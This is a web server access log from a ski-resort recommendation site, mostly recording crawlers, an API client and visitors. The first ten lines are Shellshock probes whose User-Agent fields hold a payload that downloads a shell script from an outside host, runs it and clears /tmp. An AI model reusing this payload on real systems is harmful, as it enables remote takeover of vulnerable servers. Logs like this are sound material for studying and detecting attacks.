222.141.64.65 - - [29/Mar/2016:20:46:13 -0700] "GET /cgi-bin/Count.cgi HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:14 -0700] "GET /cgi-bin/supply.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:14 -0700] "GET /cgi-bin/test.sh HTTP/1.1" 404 470 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:15 -0700] "GET /cgi-bin/upload.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:15 -0700] "GET /cgi-bin/welcome.cgi HTTP/1.1" 404 473 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:16 -0700] "GET /cgi-bin/status.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:16 -0700] "GET /cgi-bin/uptime.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:16 -0700] "GET /cgi-bin/contact.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:17 -0700] "GET /cgi-bin/forum.cgi HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
222.141.64.65 - - [29/Mar/2016:20:46:17 -0700] "GET /cgi-bin/php5-cli HTTP/1.1" 404 472 "-" "() { :;};/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; busybox wget http://b.1339.cf/mepknjb.sh -O /tmp/mepknjb.sh ; curl -O /tmp/mepknjb.sh http://b.1339.cf/mepknjb.sh;sh /tmp/mepknjb.sh ; rm -rf /tmp/mepknjb.sh; rm -f /tmp/* \");'"
98.238.221.0 - - [29/Mar/2016:20:54:10 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586"
98.238.221.0 - - [29/Mar/2016:20:54:30 -0700] "-" 408 0 "-" "-"
107.77.109.108 - - [29/Mar/2016:21:06:01 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Linux; Android 5.0.2; HTC One_M8 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.105 Mobile Safari/537.36"
123.117.40.54 - - [29/Mar/2016:21:17:42 -0700] "GET / HTTP/1.1" 200 6976 "-" "-"
73.225.96.186 - - [29/Mar/2016:21:22:10 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
73.225.96.186 - - [29/Mar/2016:21:22:10 -0700] "GET /styles/ee08faa9.main.css HTTP/1.1" 200 19446 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
73.225.96.186 - - [29/Mar/2016:21:22:10 -0700] "GET /scripts/scripts/vendor/modernizr.js HTTP/1.1" 200 4903 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
73.225.96.186 - - [29/Mar/2016:21:22:10 -0700] "GET /bower_components/requirejs/require.js HTTP/1.1" 200 6702 "http://whereshouldiski.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
184.96.27.199 - - [29/Mar/2016:21:33:06 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
180.76.15.23 - - [29/Mar/2016:21:33:17 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.155 - - [29/Mar/2016:21:34:16 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [29/Mar/2016:21:37:57 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 999 "-" "node-superagent/1.4.0"
66.249.79.248 - - [29/Mar/2016:21:38:01 -0700] "GET /lib/reccapi.php?resort=crystalmountain&date=2016-01-21 HTTP/1.1" 200 1081 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.135 - - [29/Mar/2016:21:38:02 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=crystalmountain&dateStart=2016-01-19 HTTP/1.1" 200 881 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.234 - - [29/Mar/2016:21:38:04 -0700] "GET /lib/reccapi.php?fields=t&date=2016-01-21&coords=46.92%2C-121.49&size=7&sort=distance HTTP/1.1" 200 1391 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [29/Mar/2016:21:46:49 -0700] "GET /lib/reccapi.php?resort=killington HTTP/1.1" 200 1076 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:21:46:59 -0700] "GET /lib/reccapi.php?resort=kirkwood HTTP/1.1" 200 1049 "-" "node-superagent/1.4.0"
76.4.3.23 - - [29/Mar/2016:21:52:02 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
66.249.79.135 - - [29/Mar/2016:21:52:31 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 304 187 "-" "Googlebot-Image/1.0"
170.75.162.130 - - [29/Mar/2016:22:00:41 -0700] "GET /lib/reccapi.php?resort=deervalley HTTP/1.1" 200 1083 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:06:31 -0700] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1054 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:06:31 -0700] "GET /lib/reccapi.php?resort=smugglersnotch HTTP/1.1" 200 1062 "-" "node-superagent/1.4.0"
75.61.135.37 - - [29/Mar/2016:22:06:43 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
170.75.162.130 - - [29/Mar/2016:22:07:41 -0700] "GET /lib/reccapi.php?resort=chinapeak HTTP/1.1" 200 1006 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:08:01 -0700] "GET /lib/reccapi.php?resort=brighton HTTP/1.1" 200 1034 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:08:02 -0700] "GET /lib/reccapi.php?resort=solitude HTTP/1.1" 200 1028 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:08:12 -0700] "GET /lib/reccapi.php?resort=mountainhigh HTTP/1.1" 200 1085 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:12:52 -0700] "GET /lib/reccapi.php?resort=monarch HTTP/1.1" 200 1052 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:13:02 -0700] "GET /lib/reccapi.php?resort=telluride HTTP/1.1" 200 1064 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:14:43 -0700] "GET /lib/reccapi.php?resort=steamboat HTTP/1.1" 200 1038 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:15:13 -0700] "GET /lib/reccapi.php?resort=silverstarmountain HTTP/1.1" 200 934 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:21:54 -0700] "GET /lib/reccapi.php?resort=stevenspass HTTP/1.1" 200 967 "-" "node-superagent/1.4.0"
68.190.177.24 - - [29/Mar/2016:22:22:45 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (X11; CrOS x86_64 7834.60.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.95 Safari/537.36"
180.76.15.20 - - [29/Mar/2016:22:29:56 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.23 - - [29/Mar/2016:22:30:44 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [29/Mar/2016:22:30:55 -0700] "GET /lib/reccapi.php?resort=brianhead HTTP/1.1" 200 1095 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:22:43:56 -0700] "GET /lib/reccapi.php?resort=mtrose HTTP/1.1" 200 1050 "-" "node-superagent/1.4.0"
178.255.215.81 - - [29/Mar/2016:22:46:26 -0700] "GET /robots.txt HTTP/1.1" 200 382 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
178.255.215.81 - - [29/Mar/2016:22:46:27 -0700] "GET / HTTP/1.1" 304 173 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
123.30.175.214 - - [29/Mar/2016:23:02:53 -0700] "GET /robots.txt HTTP/1.1" 200 382 "-" "Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
123.30.175.214 - - [29/Mar/2016:23:02:58 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
123.30.175.213 - - [29/Mar/2016:23:03:02 -0700] "GET /robots.txt HTTP/1.1" 200 382 "-" "Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
123.30.175.213 - - [29/Mar/2016:23:03:06 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (compatible; coccoc/1.0; +http://help.coccoc.com/)"
170.75.162.130 - - [29/Mar/2016:23:04:49 -0700] "GET /lib/reccapi.php?resort=aspenheights HTTP/1.1" 200 1060 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:04:49 -0700] "GET /lib/reccapi.php?resort=crestedbutte HTTP/1.1" 200 1057 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:04:49 -0700] "GET /lib/reccapi.php?resort=buttermilk HTTP/1.1" 200 1056 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:04:49 -0700] "GET /lib/reccapi.php?resort=aspenmountain HTTP/1.1" 200 1056 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:04:49 -0700] "GET /lib/reccapi.php?resort=keystone HTTP/1.1" 200 1081 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:04:49 -0700] "GET /lib/reccapi.php?resort=loveland HTTP/1.1" 200 1073 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:04:49 -0700] "GET /lib/reccapi.php?resort=coppermountain HTTP/1.1" 200 1096 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:04:49 -0700] "GET /lib/reccapi.php?resort=snowmass HTTP/1.1" 200 1043 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:04:49 -0700] "GET /lib/reccapi.php?resort=winterpark HTTP/1.1" 200 1058 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:00 -0700] "GET /lib/reccapi.php?resort=49degreesnorth HTTP/1.1" 200 995 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:01 -0700] "GET /lib/reccapi.php?resort=alpinemeadows HTTP/1.1" 200 1039 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:01 -0700] "GET /lib/reccapi.php?resort=grandtarghee HTTP/1.1" 200 1083 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:02 -0700] "GET /lib/reccapi.php?resort=mountspokane HTTP/1.1" 200 1002 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:02 -0700] "GET /lib/reccapi.php?resort=redmountain HTTP/1.1" 200 914 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:02 -0700] "GET /lib/reccapi.php?resort=sugarloaf HTTP/1.1" 200 1023 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:21 -0700] "GET /lib/reccapi.php?resort=cannonmountain HTTP/1.1" 200 1100 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:21 -0700] "GET /lib/reccapi.php?resort=heavenly HTTP/1.1" 200 1055 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:21 -0700] "GET /lib/reccapi.php?resort=jaypeak HTTP/1.1" 200 1053 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:21 -0700] "GET /lib/reccapi.php?resort=madriverglen HTTP/1.1" 200 1104 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:22 -0700] "GET /lib/reccapi.php?resort=snowbird HTTP/1.1" 200 1033 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:15:22 -0700] "GET /lib/reccapi.php?resort=stowe HTTP/1.1" 200 1039 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:16:00 -0700] "GET /lib/reccapi.php?resort=sundayriver HTTP/1.1" 200 1022 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:16:00 -0700] "GET /lib/reccapi.php?resort=whistlerblackcomb HTTP/1.1" 200 938 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:16:00 -0700] "GET /lib/reccapi.php?resort=hoodoo HTTP/1.1" 200 978 "-" "node-superagent/1.4.0"
170.75.162.130 - - [29/Mar/2016:23:16:00 -0700] "GET /lib/reccapi.php?resort=wildcatmountain HTTP/1.1" 200 1094 "-" "node-superagent/1.4.0"
66.249.79.135 - - [29/Mar/2016:23:18:37 -0700] "GET /lib/reccapi.php?resort=mountbaker&date=2016-03-06 HTTP/1.1" 200 1094 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.248 - - [29/Mar/2016:23:18:38 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=mountbaker&dateStart=2016-03-04 HTTP/1.1" 200 880 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.135 - - [29/Mar/2016:23:18:38 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-06&coords=48.86%2C-121.68&size=7&sort=distance HTTP/1.1" 200 1432 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.134 - - [29/Mar/2016:23:26:53 -0700] "GET / HTTP/1.1" 200 2578 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.159 - - [29/Mar/2016:23:33:45 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.22 - - [29/Mar/2016:23:34:44 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
157.55.39.198 - - [29/Mar/2016:23:39:28 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.248 - - [29/Mar/2016:23:48:46 -0700] "GET /lib/reccapi.php?resort=antelopebutte&date=2016-03-30 HTTP/1.1" 200 1150 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.248 - - [29/Mar/2016:23:48:47 -0700] "GET /lib/resortDataSearchD3.php?size=7&sortDate=T&resort=antelopebutte&dateStart=2016-03-28 HTTP/1.1" 200 877 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.248 - - [29/Mar/2016:23:48:48 -0700] "GET /lib/reccapi.php?fields=t&date=2016-03-30&coords=44.62%2C-107.51&size=7&sort=distance HTTP/1.1" 200 1390 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
99.108.138.181 - - [29/Mar/2016:23:50:20 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; ADR6350 Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
170.75.162.130 - - [29/Mar/2016:23:56:36 -0700] "GET /lib/reccapi.php?resort=alta HTTP/1.1" 200 1030 "-" "node-superagent/1.4.0"
50.188.144.117 - - [29/Mar/2016:23:59:48 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/601.5.17 (KHTML, like Gecko) Version/9.1 Safari/601.5.17"
66.249.79.234 - - [30/Mar/2016:00:23:24 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.138 - - [30/Mar/2016:00:31:46 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.6 - - [30/Mar/2016:00:32:43 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [30/Mar/2016:00:36:31 -0700] "GET /lib/reccapi.php?resort=whitefacemountain HTTP/1.1" 200 1000 "-" "node-superagent/1.4.0"
76.105.234.57 - - [30/Mar/2016:00:37:19 -0700] "GET /images/wsis-logo-sm.png HTTP/1.1" 200 6108 "http://www.thebackcountry.net/" "Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1"
77.75.79.119 - - [30/Mar/2016:00:40:53 -0700] "GET /robots.txt HTTP/1.1" 200 419 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)"
77.75.79.119 - - [30/Mar/2016:00:40:54 -0700] "GET /resorts?resort=mountainhigh HTTP/1.1" 404 506 "-" "Mozilla/5.0 (compatible; SeznamBot/3.2; +http://fulltext.sblog.cz/)"
170.75.162.130 - - [30/Mar/2016:00:43:22 -0700] "GET /lib/reccapi.php?resort=mounthoodmeadows HTTP/1.1" 200 1001 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:00:43:22 -0700] "GET /lib/reccapi.php?resort=mountbachelor HTTP/1.1" 200 991 "-" "node-superagent/1.4.0"
185.25.151.159 - - [30/Mar/2016:01:06:04 -0700] "GET http://testp3.pospr.waw.pl/testproxy.php HTTP/1.1" 404 449 "-" "Mozilla/5.0 (Windows NT 5.1; rv:32.0) Gecko/20100101 Firefox/31.0"
170.75.162.130 - - [30/Mar/2016:01:11:06 -0700] "GET /lib/reccapi.php?resort=sunpeaksresort HTTP/1.1" 200 925 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:01:19:47 -0700] "GET /lib/reccapi.php?resort=squawvalleyusa HTTP/1.1" 200 1003 "-" "node-superagent/1.4.0"
180.76.15.33 - - [30/Mar/2016:01:29:58 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.138 - - [30/Mar/2016:01:30:47 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [30/Mar/2016:01:43:10 -0700] "GET /lib/reccapi.php?resort=sugarbowl HTTP/1.1" 200 969 "-" "node-superagent/1.4.0"
66.249.79.234 - - [30/Mar/2016:01:51:32 -0700] "GET /lib/reccapi.php?resort=mammothmountain&date=2016-01-06 HTTP/1.1" 200 725 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [30/Mar/2016:01:52:01 -0700] "GET /lib/reccapi.php?resort=angelfire HTTP/1.1" 200 1031 "-" "node-superagent/1.4.0"
199.16.156.124 - - [30/Mar/2016:01:55:23 -0700] "GET /robots.txt HTTP/1.1" 200 363 "-" "Twitterbot/1.0"
199.16.156.124 - - [30/Mar/2016:01:55:24 -0700] "GET /recommendations HTTP/1.1" 404 450 "-" "Twitterbot/1.0"
170.75.162.130 - - [30/Mar/2016:01:55:51 -0700] "GET /lib/reccapi.php?resort=parkcity HTTP/1.1" 200 1095 "-" "node-superagent/1.4.0"
178.255.215.81 - - [30/Mar/2016:02:07:27 -0700] "GET /resorts?resort=brighton HTTP/1.1" 404 469 "-" "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)"
170.75.162.130 - - [30/Mar/2016:02:18:15 -0700] "GET /lib/reccapi.php?resort=crystalmountain HTTP/1.1" 200 970 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:02:26:26 -0700] "GET /lib/reccapi.php?resort=schweitzer HTTP/1.1" 200 980 "-" "node-superagent/1.4.0"
180.76.15.136 - - [30/Mar/2016:02:32:29 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.158 - - [30/Mar/2016:02:33:27 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [30/Mar/2016:02:34:07 -0700] "GET /lib/reccapi.php?resort=alyeska HTTP/1.1" 200 964 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:02:36:37 -0700] "GET /lib/reccapi.php?resort=redlodge HTTP/1.1" 200 1107 "-" "node-superagent/1.4.0"
107.150.32.62 - - [30/Mar/2016:02:44:15 -0700] "GET / HTTP/1.1" 200 6976 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
170.75.162.130 - - [30/Mar/2016:02:45:49 -0700] "GET /lib/reccapi.php?resort=sunvalley HTTP/1.1" 200 988 "-" "node-superagent/1.4.0"
66.249.79.135 - - [30/Mar/2016:03:05:31 -0700] "GET / HTTP/1.1" 200 2615 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.234 - - [30/Mar/2016:03:31:13 -0700] "GET /lib/reccapi.php?resort=bearvalleymountain&date=2016-01-10 HTTP/1.1" 200 722 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.76.15.9 - - [30/Mar/2016:03:31:16 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
180.76.15.154 - - [30/Mar/2016:03:32:09 -0700] "GET / HTTP/1.1" 200 6995 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
170.75.162.130 - - [30/Mar/2016:03:34:13 -0700] "GET /lib/reccapi.php?resort=sierra-at-tahoe HTTP/1.1" 200 980 "-" "node-superagent/1.4.0"
66.249.79.234 - - [30/Mar/2016:03:45:22 -0700] "GET /lib/reccapi.php?resort=bearvalleymountain&date=2016-01-07 HTTP/1.1" 200 723 "http://whereshouldiski.com/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
170.75.162.130 - - [30/Mar/2016:03:48:14 -0700] "GET /lib/reccapi.php?resort=taos HTTP/1.1" 200 1025 "-" "node-superagent/1.4.0"
170.75.162.130 - - [30/Mar/2016:04:17:48 -0700] "GET /lib/reccapi.php?resort=bigsky HTTP/1.1" 200 1039 "-" "node-superagent/1.4.0"
66.249.74.56 - - [30/Mar/2016:04:28:04 -0700] "GET /robots.txt HTTP/1.1" 200 419 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
